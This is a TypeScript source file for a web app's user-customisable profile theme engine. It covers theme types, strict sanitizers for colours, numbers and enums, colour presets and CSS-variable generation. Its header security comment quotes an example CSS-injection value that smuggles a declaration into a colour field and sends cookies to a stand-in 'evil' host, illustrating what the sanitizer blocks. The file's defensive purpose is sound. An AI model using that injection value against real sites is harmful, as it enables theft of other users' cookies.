/**
 * Code4Ever — Spark Gradient Theme Engine
 * ---------------------------------------
 * Spark supporters can repaint their Code4Ever experience: every surface colour, the text
 * colours, borders, radius, glow AND the full gradient definition (type, angle, centre point
 * and an arbitrary number of colour stops) of the background, cards, accent and banner.
 *
 * A saved theme travels with the profile, so other members see the author's colours on their
 * profile page and profile card.
 *
 * SECURITY NOTE — this file is the trust boundary for themes.
 * A theme is data written by one user and rendered in *other* users' browsers. Nothing that
 * reaches CSS is ever taken verbatim from the stored object: colours must match a strict hex
 * pattern, numbers are clamped to a range, and enums fall back to a default. That makes CSS
 * injection (e.g. a "colour" of `red;background:url(https://evil/?cookie=`) impossible.
 */

import type { CSSProperties } from 'react';

export type GradientKind = 'linear' | 'radial' | 'conic';
export type FillKind = 'solid' | 'gradient';

export interface ThemeGradientStop {
  color: string;
  /** 0-100 percentage along the gradient line. */
  position: number;
}

export interface ThemeGradient {
  kind: GradientKind;
  /** Direction in degrees for linear/conic gradients. */
  angle: number;
  /** Radial gradient shape. */
  shape: 'circle' | 'ellipse';
  /** Origin of radial/conic gradients, in percent. */
  centerX: number;
  centerY: number;
  stops: ThemeGradientStop[];
  /** Slowly animates the gradient position. */
  animate: boolean;
}

export interface ThemeFill {
  kind: FillKind;
  color: string;
  gradient: ThemeGradient;
}

export interface ProfileTheme {
  version: 1;
  /** Apply the theme to the owner's own session. */
  enabled: boolean;
  /** Let other members see this theme on the owner's profile. */
  shareWithVisitors: boolean;
  /** Paint the entire application, not just profile surfaces. */
  paintWholeApp: boolean;
  background: ThemeFill;
  surface: ThemeFill;
  accent: ThemeFill;
  /**
   * Profile banner. `useProfileImage` keeps the member's uploaded banner photo and only uses
   * the gradient as a fallback — selecting a theme must never silently delete a banner the
   * user uploaded.
   */
  banner: ThemeFill & { overlayOpacity: number; useProfileImage: boolean };
  text: {
    primary: string;
    muted: string;
    onAccent: string;
    code: string;
    link: string;
  };
  border: {
    color: string;
    /** Corner radius in pixels. */
    radius: number;
    /** Border width in pixels. */
    width: number;
  };
  glow: {
    color: string;
    /** 0-100 */
    intensity: number;
  };
  effects: {
    /** Card backdrop blur in pixels. */
    blur: number;
    /** Draw the signature Code4Ever grid overlay. */
    grid: boolean;
  };
}

// -------------------------------------------------------------
// VALIDATION PRIMITIVES
// -------------------------------------------------------------

const HEX_COLOR = /^#(?:[0-9a-f]{3}|[0-9a-f]{4}|[0-9a-f]{6}|[0-9a-f]{8})$/i;

export function isValidColor(value: unknown): value is string {
  return typeof value === 'string' && HEX_COLOR.test(value.trim());
}

export function sanitizeColor(value: unknown, fallback: string): string {
  if (isValidColor(value)) return value.trim().toLowerCase();
  return fallback;
}

export function clampNumber(value: unknown, min: number, max: number, fallback: number): number {
  const num = typeof value === 'number' ? value : Number(value);
  if (!Number.isFinite(num)) return fallback;
  return Math.min(max, Math.max(min, Math.round(num * 100) / 100));
}

function sanitizeEnum<T extends string>(value: unknown, allowed: readonly T[], fallback: T): T {
  return typeof value === 'string' && (allowed as readonly string[]).includes(value) ? (value as T) : fallback;
}

export const MAX_GRADIENT_STOPS = 6;
export const MIN_GRADIENT_STOPS = 2;

export function sanitizeGradient(raw: unknown, fallback: ThemeGradient): ThemeGradient {
  const source = (raw && typeof raw === 'object' ? raw : {}) as Partial<ThemeGradient>;

  let stops: ThemeGradientStop[] = Array.isArray(source.stops)
    ? source.stops
        .slice(0, MAX_GRADIENT_STOPS)
        .filter((stop) => stop && typeof stop === 'object')
        .map((stop, index) => ({
          color: sanitizeColor((stop as ThemeGradientStop).color, fallback.stops[index]?.color || '#3b82f6'),
          position: clampNumber((stop as ThemeGradientStop).position, 0, 100, index === 0 ? 0 : 100)
        }))
    : [];

  if (stops.length < MIN_GRADIENT_STOPS) {
    stops = fallback.stops.map((stop) => ({ ...stop }));
  }

  // Gradient stops must be monotonically increasing for a predictable render.
  stops.sort((a, b) => a.position - b.position);

  return {
    kind: sanitizeEnum<GradientKind>(source.kind, ['linear', 'radial', 'conic'], fallback.kind),
    angle: clampNumber(source.angle, 0, 360, fallback.angle),
    shape: sanitizeEnum<'circle' | 'ellipse'>(source.shape, ['circle', 'ellipse'], fallback.shape),
    centerX: clampNumber(source.centerX, 0, 100, fallback.centerX),
    centerY: clampNumber(source.centerY, 0, 100, fallback.centerY),
    stops,
    animate: source.animate === true
  };
}

function sanitizeFill(raw: unknown, fallback: ThemeFill): ThemeFill {
  const source = (raw && typeof raw === 'object' ? raw : {}) as Partial<ThemeFill>;
  return {
    kind: sanitizeEnum<FillKind>(source.kind, ['solid', 'gradient'], fallback.kind),
    color: sanitizeColor(source.color, fallback.color),
    gradient: sanitizeGradient(source.gradient, fallback.gradient)
  };
}

// -------------------------------------------------------------
// DEFAULTS & PRESETS
// -------------------------------------------------------------

function gradient(
  kind: GradientKind,
  angle: number,
  stops: Array<[string, number]>,
  extra: Partial<ThemeGradient> = {}
): ThemeGradient {
  return {
    kind,
    angle,
    shape: 'ellipse',
    centerX: 50,
    centerY: 0,
    stops: stops.map(([color, position]) => ({ color, position })),
    animate: false,
    ...extra
  };
}

export const DEFAULT_PROFILE_THEME: ProfileTheme = {
  version: 1,
  enabled: false,
  shareWithVisitors: true,
  paintWholeApp: true,
  background: {
    kind: 'solid',
    color: '#09090b',
    gradient: gradient('linear', 160, [
      ['#09090b', 0],
      ['#111827', 100]
    ])
  },
  surface: {
    kind: 'solid',
    color: '#121215',
    gradient: gradient('linear', 180, [
      ['#121215', 0],
      ['#18181b', 100]
    ])
  },
  accent: {
    kind: 'gradient',
    color: '#3b82f6',
    gradient: gradient('linear', 90, [
      ['#3b82f6', 0],
      ['#8b5cf6', 100]
    ])
  },
  banner: {
    kind: 'gradient',
    color: '#1e293b',
    gradient: gradient('linear', 120, [
      ['#1e3a8a', 0],
      ['#7c3aed', 100]
    ]),
    overlayOpacity: 55,
    useProfileImage: true
  },
  text: {
    primary: '#f4f4f5',
    muted: '#a1a1aa',
    onAccent: '#ffffff',
    code: '#34d399',
    link: '#60a5fa'
  },
  border: {
    color: '#27272a',
    radius: 14,
    width: 1
  },
  glow: {
    color: '#3b82f6',
    intensity: 18
  },
  effects: {
    blur: 0,
    grid: true
  }
};

export interface ThemePreset {
  id: string;
  name: string;
  description: string;
  theme: ProfileTheme;
}

function preset(id: string, name: string, description: string, overrides: Partial<ProfileTheme>): ThemePreset {
  return {
    id,
    name,
    description,
    theme: sanitizeProfileTheme({ ...DEFAULT_PROFILE_THEME, ...overrides, enabled: true })
  };
}

export const THEME_PRESETS: ThemePreset[] = [
  preset('spark_gold', 'Spark Altın', 'Sıcak altın parıltı', {
    background: {
      kind: 'gradient',
      color: '#0b0906',
      gradient: gradient('linear', 165, [
        ['#0b0906', 0],
        ['#231a08', 60],
        ['#3d2a05', 100]
      ])
    },
    surface: {
      kind: 'gradient',
      color: '#16120a',
      gradient: gradient('linear', 180, [
        ['#16120a', 0],
        ['#221a0c', 100]
      ])
    },
    accent: {
      kind: 'gradient',
      color: '#f59e0b',
      gradient: gradient('linear', 90, [
        ['#fbbf24', 0],
        ['#f59e0b', 55],
        ['#b45309', 100]
      ])
    },
    banner: {
      kind: 'gradient',
      color: '#f59e0b',
      gradient: gradient('linear', 120, [
        ['#78350f', 0],
        ['#f59e0b', 100]
      ]),
      overlayOpacity: 45,
      useProfileImage: true
    },
    text: { primary: '#fef3c7', muted: '#d6b98c', onAccent: '#1c1207', code: '#fbbf24', link: '#fbbf24' },
    border: { color: '#4d3a12', radius: 18, width: 1 },
    glow: { color: '#f59e0b', intensity: 26 },
    effects: { blur: 0, grid: true }
  }),
  preset('neon_violet', 'Neon Mor', 'Siberpunk mor/pembe geçiş', {
    background: {
      kind: 'gradient',
      color: '#0a0713',
      gradient: gradient('radial', 0, [
        ['#2e1065', 0],
        ['#0a0713', 100]
      ], { centerX: 50, centerY: 0, shape: 'ellipse' })
    },
    surface: {
      kind: 'gradient',
      color: '#140d24',
      gradient: gradient('linear', 200, [
        ['#160f28', 0],
        ['#0e0a1a', 100]
      ])
    },
    accent: {
      kind: 'gradient',
      color: '#a855f7',
      gradient: gradient('linear', 110, [
        ['#ec4899', 0],
        ['#a855f7', 50],
        ['#6366f1', 100]
      ], { animate: true })
    },
    banner: {
      kind: 'gradient',
      color: '#a855f7',
      gradient: gradient('conic', 45, [
        ['#ec4899', 0],
        ['#8b5cf6', 50],
        ['#22d3ee', 100]
      ], { centerX: 50, centerY: 50 }),
      overlayOpacity: 40,
      useProfileImage: true
    },
    text: { primary: '#f5f3ff', muted: '#b8a9d9', onAccent: '#ffffff', code: '#67e8f9', link: '#e879f9' },
    border: { color: '#3b2a63', radius: 20, width: 1 },
    glow: { color: '#a855f7', intensity: 34 },
    effects: { blur: 2, grid: true }
  }),
  preset('ocean', 'Derin Okyanus', 'Sakin mavi-turkuaz', {
    background: {
      kind: 'gradient',
      color: '#04121c',
      gradient: gradient('linear', 180, [
        ['#04121c', 0],
        ['#062a3a', 100]
      ])
    },
    surface: {
      kind: 'solid',
      color: '#0a1f2b',
      gradient: gradient('linear', 180, [
        ['#0a1f2b', 0],
        ['#0d2735', 100]
      ])
    },
    accent: {
      kind: 'gradient',
      color: '#06b6d4',
      gradient: gradient('linear', 90, [
        ['#22d3ee', 0],
        ['#0891b2', 100]
      ])
    },
    banner: {
      kind: 'gradient',
      color: '#0891b2',
      gradient: gradient('linear', 135, [
        ['#0e7490', 0],
        ['#155e75', 60],
        ['#22d3ee', 100]
      ]),
      overlayOpacity: 50,
      useProfileImage: true
    },
    text: { primary: '#ecfeff', muted: '#93b8c4', onAccent: '#03212b', code: '#5eead4', link: '#22d3ee' },
    border: { color: '#155e75', radius: 16, width: 1 },
    glow: { color: '#06b6d4', intensity: 22 },
    effects: { blur: 0, grid: true }
  }),
  preset('sunset', 'Gün Batımı', 'Turuncu-kırmızı sıcaklık', {
    background: {
      kind: 'gradient',
      color: '#160a0a',
      gradient: gradient('linear', 200, [
        ['#160a0a', 0],
        ['#3b1112', 70],
        ['#7c2d12', 100]
      ])
    },
    surface: {
      kind: 'gradient',
      color: '#1d0f0f',
      gradient: gradient('linear', 180, [
        ['#1d0f0f', 0],
        ['#2a1413', 100]
      ])
    },
    accent: {
      kind: 'gradient',
      color: '#f97316',
      gradient: gradient('linear', 75, [
        ['#fb7185', 0],
        ['#f97316', 100]
      ])
    },
    banner: {
      kind: 'gradient',
      color: '#f97316',
      gradient: gradient('linear', 110, [
        ['#9f1239', 0],
        ['#f97316', 100]
      ]),
      overlayOpacity: 45,
      useProfileImage: true
    },
    text: { primary: '#fff7ed', muted: '#d8b4a0', onAccent: '#1a0b05', code: '#fdba74', link: '#fb923c' },
    border: { color: '#5b2420', radius: 18, width: 1 },
    glow: { color: '#f97316', intensity: 24 },
    effects: { blur: 0, grid: false }
  }),
  preset('matrix', 'Matrix', 'Terminal yeşili', {
    background: {
      kind: 'gradient',
      color: '#020a05',
      gradient: gradient('linear', 180, [
        ['#020a05', 0],
        ['#03160c', 100]
      ])
    },
    surface: {
      kind: 'solid',
      color: '#04180d',
      gradient: gradient('linear', 180, [
        ['#04180d', 0],
        ['#062112', 100]
      ])
    },
    accent: {
      kind: 'gradient',
      color: '#22c55e',
      gradient: gradient('linear', 90, [
        ['#4ade80', 0],
        ['#15803d', 100]
      ])
    },
    banner: {
      kind: 'gradient',
      color: '#16a34a',
      gradient: gradient('linear', 140, [
        ['#052e16', 0],
        ['#22c55e', 100]
      ]),
      overlayOpacity: 55,
      useProfileImage: true
    },
    text: { primary: '#dcfce7', muted: '#86b39a', onAccent: '#04180d', code: '#4ade80', link: '#4ade80' },
    border: { color: '#14532d', radius: 10, width: 1 },
    glow: { color: '#22c55e', intensity: 20 },
    effects: { blur: 0, grid: true }
  }),
  preset('aurora', 'Aurora', 'Çok renkli kuzey ışıkları', {
    background: {
      kind: 'gradient',
      color: '#060814',
      gradient: gradient('conic', 210, [
        ['#0f172a', 0],
        ['#164e63', 35],
        ['#312e81', 70],
        ['#060814', 100]
      ], { centerX: 30, centerY: 20, animate: true })
    },
    surface: {
      kind: 'gradient',
      color: '#0d1226',
      gradient: gradient('linear', 160, [
        ['#0d1226', 0],
        ['#131a33', 100]
      ])
    },
    accent: {
      kind: 'gradient',
      color: '#38bdf8',
      gradient: gradient('linear', 120, [
        ['#34d399', 0],
        ['#38bdf8', 50],
        ['#818cf8', 100]
      ], { animate: true })
    },
    banner: {
      kind: 'gradient',
      color: '#38bdf8',
      gradient: gradient('linear', 100, [
        ['#134e4a', 0],
        ['#38bdf8', 55],
        ['#a78bfa', 100]
      ]),
      overlayOpacity: 42,
      useProfileImage: true
    },
    text: { primary: '#eef2ff', muted: '#a5b0d6', onAccent: '#05122a', code: '#5eead4', link: '#7dd3fc' },
    border: { color: '#25305c', radius: 22, width: 1 },
    glow: { color: '#38bdf8', intensity: 30 },
    effects: { blur: 3, grid: true }
  })
];

// -------------------------------------------------------------
// SANITIZER (the trust boundary)
// -------------------------------------------------------------

export function sanitizeProfileTheme(raw: unknown): ProfileTheme {
  const source = (raw && typeof raw === 'object' ? raw : {}) as Partial<ProfileTheme>;
  const fallback = DEFAULT_PROFILE_THEME;

  const bannerFallback = fallback.banner;
  const bannerSource = (source.banner && typeof source.banner === 'object' ? source.banner : {}) as Partial<
    ProfileTheme['banner']
  >;

  return {
    version: 1,
    enabled: source.enabled === true,
    shareWithVisitors: source.shareWithVisitors !== false,
    paintWholeApp: source.paintWholeApp !== false,
    background: sanitizeFill(source.background, fallback.background),
    surface: sanitizeFill(source.surface, fallback.surface),
    accent: sanitizeFill(source.accent, fallback.accent),
    banner: {
      ...sanitizeFill(bannerSource, bannerFallback),
      overlayOpacity: clampNumber(bannerSource.overlayOpacity, 0, 100, bannerFallback.overlayOpacity),
      // Defaults to true, so themes saved before this option existed keep the uploaded banner.
      useProfileImage: bannerSource.useProfileImage !== false
    },
    text: {
      primary: sanitizeColor(source.text?.primary, fallback.text.primary),
      muted: sanitizeColor(source.text?.muted, fallback.text.muted),
      onAccent: sanitizeColor(source.text?.onAccent, fallback.text.onAccent),
      code: sanitizeColor(source.text?.code, fallback.text.code),
      link: sanitizeColor(source.text?.link, fallback.text.link)
    },
    border: {
      color: sanitizeColor(source.border?.color, fallback.border.color),
      radius: clampNumber(source.border?.radius, 0, 40, fallback.border.radius),
      width: clampNumber(source.border?.width, 0, 4, fallback.border.width)
    },
    glow: {
      color: sanitizeColor(source.glow?.color, fallback.glow.color),
      intensity: clampNumber(source.glow?.intensity, 0, 100, fallback.glow.intensity)
    },
    effects: {
      blur: clampNumber(source.effects?.blur, 0, 24, fallback.effects.blur),
      grid: source.effects?.grid !== false
    }
  };
}

/** Returns a usable theme, or null when the profile has none / it is switched off. */
export function normalizeProfileTheme(raw: unknown): ProfileTheme | null {
  if (!raw) return null;
  let parsed: unknown = raw;
  if (typeof raw === 'string') {
    try {
      parsed = JSON.parse(raw);
    } catch {
      return null;
    }
  }
  if (!parsed || typeof parsed !== 'object') return null;
  const theme = sanitizeProfileTheme(parsed);
  return theme.enabled ? theme : null;
}

// -------------------------------------------------------------
// CSS GENERATION
// -------------------------------------------------------------

export function gradientToCss(spec: ThemeGradient): string {
  const stops = [...spec.stops]
    .sort((a, b) => a.position - b.position)
    .map((stop) => `${stop.color} ${stop.position}%`)
    .join(', ');

  if (spec.kind === 'radial') {
    return `radial-gradient(${spec.shape} at ${spec.centerX}% ${spec.centerY}%, ${stops})`;
  }
  if (spec.kind === 'conic') {
    return `conic-gradient(from ${spec.angle}deg at ${spec.centerX}% ${spec.centerY}%, ${stops})`;
  }
  return `linear-gradient(${spec.angle}deg, ${stops})`;
}

/** Background-image value for a fill ('none' when the fill is a flat colour). */
export function fillToImage(fill: ThemeFill): string {
  return fill.kind === 'gradient' ? gradientToCss(fill.gradient) : 'none';
}

/** Representative flat colour for a fill (used for borders, rings and fallbacks). */
export function fillToColor(fill: ThemeFill): string {
  if (fill.kind === 'solid') return fill.color;
  return fill.gradient.stops[0]?.color || fill.color;
}

function withAlpha(hexColor: string, alphaPercent: number): string {
  const alpha = Math.round(clampNumber(alphaPercent, 0, 100, 0) * 2.55)
    .toString(16)
    .padStart(2, '0');
  const base = hexColor.length === 4 || hexColor.length === 5
    ? `#${hexColor[1]}${hexColor[1]}${hexColor[2]}${hexColor[2]}${hexColor[3]}${hexColor[3]}`
    : hexColor.slice(0, 7);
  return `${base}${alpha}`;
}

export type ThemeCssVariables = Record<string, string>;

/**
 * Maps a theme onto CSS custom properties. Both the application's own tokens (--background,
 * --card, ...) and the dedicated --c4e-* tokens are produced, so the theme reaches Tailwind
 * utility classes and bespoke components alike.
 */
export function themeToCssVariables(theme: ProfileTheme): ThemeCssVariables {
  const backgroundColor = fillToColor(theme.background);
  const surfaceColor = fillToColor(theme.surface);
  const accentColor = fillToColor(theme.accent);

  return {
    '--c4e-theme-active': '1',
    '--c4e-bg': backgroundColor,
    '--c4e-bg-image': fillToImage(theme.background),
    '--c4e-surface': surfaceColor,
    '--c4e-surface-image': fillToImage(theme.surface),
    '--c4e-surface-strong': withAlpha(surfaceColor, 100),
    '--c4e-accent': accentColor,
    '--c4e-accent-image': theme.accent.kind === 'gradient' ? gradientToCss(theme.accent.gradient) : `linear-gradient(0deg, ${accentColor}, ${accentColor})`,
    '--c4e-banner-image':
      theme.banner.kind === 'gradient' ? gradientToCss(theme.banner.gradient) : `linear-gradient(0deg, ${theme.banner.color}, ${theme.banner.color})`,
    '--c4e-banner-overlay': withAlpha(backgroundColor, theme.banner.overlayOpacity),
    '--c4e-text': theme.text.primary,
    '--c4e-text-muted': theme.text.muted,
    '--c4e-on-accent': theme.text.onAccent,
    '--c4e-code': theme.text.code,
    '--c4e-link': theme.text.link,
    '--c4e-border': theme.border.color,
    '--c4e-border-width': `${theme.border.width}px`,
    '--c4e-radius': `${theme.border.radius}px`,
    '--c4e-glow-color': theme.glow.color,
    '--c4e-glow': `radial-gradient(60% 60% at 50% 0%, ${withAlpha(theme.glow.color, theme.glow.intensity)}, transparent 70%)`,
    '--c4e-blur': `${theme.effects.blur}px`,
    '--c4e-grid-line': theme.effects.grid ? withAlpha(theme.text.primary, 5) : 'transparent',
    '--c4e-animate': theme.background.gradient.animate || theme.accent.gradient.animate ? 'running' : 'paused',

    // Application tokens (see src/index.css)
    '--background': backgroundColor,
    '--foreground': theme.text.primary,
    '--card': surfaceColor,
    '--card-foreground': theme.text.primary,
    '--popover': surfaceColor,
    '--secondary': surfaceColor,
    '--muted': surfaceColor,
    '--muted-foreground': theme.text.muted,
    '--accent': accentColor,
    '--border': theme.border.color,
    '--input': theme.border.color,
    '--ring': accentColor,
    '--code': theme.text.code,
    '--grid-line': theme.effects.grid ? withAlpha(theme.text.primary, 5) : 'transparent',
    '--glow': `radial-gradient(60% 60% at 50% 0%, ${withAlpha(theme.glow.color, theme.glow.intensity)}, transparent 70%)`,
    '--radius': `${theme.border.radius}px`
  };
}

/** React inline-style object for scoping a theme to one subtree (e.g. a profile card). */
export function themeToStyle(theme: ProfileTheme): CSSProperties {
  return themeToCssVariables(theme) as unknown as CSSProperties;
}

const GLOBAL_STYLE_ELEMENT_ID = 'c4e-profile-theme';

/**
 * Static override sheet. Code4Ever's components use hard-coded zinc/hex utility classes, so
 * a themed session remaps those surfaces onto the theme tokens. The selectors below are
 * fixed strings written here — no part of a user's theme ever becomes a selector or a raw
 * declaration, only the value of an already-validated custom property.
 */
/**
 * Code4Ever's components use hard-coded Tailwind zinc/hex utility classes, so a themed
 * session remaps those surfaces onto the theme tokens.
 *
 * The class lists below are FIXED strings written here — no part of a user's theme ever
 * becomes a selector or a raw declaration, only the value of an already-validated custom
 * property. Opacity variants are listed explicitly instead of using a substring selector,
 * which would also match `hover:`/`focus:` classes and paint elements that should only be
 * coloured on interaction.
 */
const ALPHA_STEPS = ['', '/10', '/20', '/30', '/40', '/50', '/60', '/70', '/80', '/90', '/95'];

function withAlphaVariants(baseClasses: string[]): string[] {
  return baseClasses.flatMap((base) => ALPHA_STEPS.map((step) => `${base}${step}`));
}

const BACKGROUND_CLASSES = ['bg-app-background', ...withAlphaVariants(['bg-zinc-950', 'bg-[#09090b]', 'bg-[#0a0a0c]'])];
const SURFACE_CLASSES = [
  'bg-app-card',
  ...withAlphaVariants(['bg-zinc-900', 'bg-[#0c0c0e]', 'bg-[#0e0e11]', 'bg-[#121215]'])
];
const ELEVATED_CLASSES = withAlphaVariants(['bg-zinc-800']);
const BORDER_CLASSES = [
  'border-app-border',
  'border-app-input',
  ...withAlphaVariants(['border-zinc-800', 'border-zinc-700', 'border-zinc-900'])
];
const MUTED_TEXT_CLASSES = ['text-app-muted', 'text-zinc-400', 'text-zinc-500', 'text-zinc-600'];
const PRIMARY_TEXT_CLASSES = ['text-app-foreground', 'text-zinc-100', 'text-zinc-200', 'text-zinc-300', 'text-white'];

/** Escapes a Tailwind class name so it can be used as a CSS class selector. */
function classSelector(className: string): string {
  return `.${className.replace(/[^a-zA-Z0-9_-]/g, (char) => `\\${char}`)}`;
}

function scopedSelectors(classNames: string[]): string {
  return classNames
    .map((name) => `html[data-c4e-theme="on"][data-c4e-scope="app"] ${classSelector(name)}`)
    .join(',\n');
}

const GLOBAL_OVERRIDE_CSS = `
html[data-c4e-theme="on"] body {
  background-color: var(--c4e-bg) !important;
  background-image: var(--c4e-glow), var(--c4e-bg-image) !important;
  background-size: 100% 100%, 100% 100% !important;
  background-attachment: fixed !important;
  color: var(--c4e-text) !important;
}

${scopedSelectors(BACKGROUND_CLASSES)} {
  background-color: var(--c4e-bg) !important;
}

${scopedSelectors(SURFACE_CLASSES)} {
  background-color: var(--c4e-surface) !important;
  background-image: var(--c4e-surface-image) !important;
}

${scopedSelectors(ELEVATED_CLASSES)} {
  background-color: color-mix(in srgb, var(--c4e-surface) 80%, var(--c4e-text) 12%) !important;
}

${scopedSelectors(BORDER_CLASSES)} {
  border-color: var(--c4e-border) !important;
}

${scopedSelectors(MUTED_TEXT_CLASSES)} {
  color: var(--c4e-text-muted) !important;
}

${scopedSelectors(PRIMARY_TEXT_CLASSES)} {
  color: var(--c4e-text) !important;
}

html[data-c4e-theme="on"][data-c4e-scope="app"] code,
html[data-c4e-theme="on"][data-c4e-scope="app"] pre,
html[data-c4e-theme="on"][data-c4e-scope="app"] .text-app-code {
  color: var(--c4e-code) !important;
}

/* Themed building blocks used by the profile surfaces and the theme studio preview. */
.c4e-theme-scope {
  background-color: var(--c4e-bg);
  background-image: var(--c4e-bg-image);
  color: var(--c4e-text);
}

.c4e-theme-surface {
  background-color: var(--c4e-surface);
  background-image: var(--c4e-surface-image);
  border: var(--c4e-border-width) solid var(--c4e-border);
  border-radius: var(--c4e-radius);
  color: var(--c4e-text);
}

.c4e-theme-accent {
  background-image: var(--c4e-accent-image);
  color: var(--c4e-on-accent);
  border-radius: var(--c4e-radius);
}

.c4e-theme-banner {
  background-image: var(--c4e-banner-image);
  background-size: cover;
  background-position: center;
}

.c4e-theme-muted { color: var(--c4e-text-muted); }
.c4e-theme-link { color: var(--c4e-link); }

.c4e-theme-animated {
  background-size: 200% 200%;
  animation: c4e-gradient-shift 14s ease infinite;
}

@keyframes c4e-gradient-shift {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

@media (prefers-reduced-motion: reduce) {
  .c4e-theme-animated { animation: none; }
}
`;

function ensureGlobalStylesheet(): void {
  if (typeof document === 'undefined') return;
  if (document.getElementById(GLOBAL_STYLE_ELEMENT_ID)) return;
  const style = document.createElement('style');
  style.id = GLOBAL_STYLE_ELEMENT_ID;
  style.textContent = GLOBAL_OVERRIDE_CSS;
  document.head.appendChild(style);
}

/**
 * Applies (or clears) the signed-in user's theme for the whole session.
 * Values are written as individual custom properties — never as a CSS text blob — so a
 * malformed value can only ever be ignored by the browser.
 */
export function applyGlobalProfileTheme(theme: ProfileTheme | null): void {
  if (typeof document === 'undefined') return;
  ensureGlobalStylesheet();

  const root = document.documentElement;
  const previous = root.getAttribute('data-c4e-vars');
  if (previous) {
    previous.split('|').forEach((name) => {
      if (name) root.style.removeProperty(name);
    });
    root.removeAttribute('data-c4e-vars');
  }

  if (!theme || !theme.enabled) {
    root.removeAttribute('data-c4e-theme');
    root.removeAttribute('data-c4e-scope');
    return;
  }

  const variables = themeToCssVariables(theme);
  Object.entries(variables).forEach(([name, value]) => {
    root.style.setProperty(name, value);
  });
  root.setAttribute('data-c4e-vars', Object.keys(variables).join('|'));
  root.setAttribute('data-c4e-theme', 'on');
  root.setAttribute('data-c4e-scope', theme.paintWholeApp ? 'app' : 'profile');
}

/** Ensures the themed helper classes exist even when no global theme is active. */
export function ensureThemeStylesheet(): void {
  ensureGlobalStylesheet();
}

/** Reads a (possibly stringified) theme from a profile record. */
export function getProfileTheme(profile: { profile_theme?: unknown; custom_fields?: Record<string, any> } | null | undefined): ProfileTheme | null {
  if (!profile) return null;
  return normalizeProfileTheme(profile.profile_theme ?? profile.custom_fields?.profile_theme ?? null);
}

/** The theme a *visitor* is allowed to see on someone else's profile. */
export function getVisibleProfileTheme(
  profile: { profile_theme?: unknown; custom_fields?: Record<string, any> } | null | undefined,
  isOwnProfile: boolean
): ProfileTheme | null {
  const theme = getProfileTheme(profile);
  if (!theme) return null;
  if (isOwnProfile) return theme;
  return theme.shareWithVisitors ? theme : null;
}
